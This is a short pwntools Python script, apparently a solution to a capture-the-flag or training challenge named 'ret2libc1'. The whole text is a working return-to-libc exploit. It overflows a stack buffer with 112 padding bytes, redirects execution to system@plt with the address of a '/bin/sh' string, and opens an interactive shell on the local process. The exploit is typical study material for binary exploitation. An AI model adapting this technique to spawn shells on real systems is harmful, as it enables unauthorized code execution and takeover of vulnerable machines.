from pwn import *

system_plt_addr = 0x8048460
bin_sh_addr = 0x8048720

payload = b'A' * 112 + p32(system_plt_addr) + b'AAAA' + p32(bin_sh_addr)

sh = process('./ret2libc1')

sh.sendline(payload)
sh.interactive()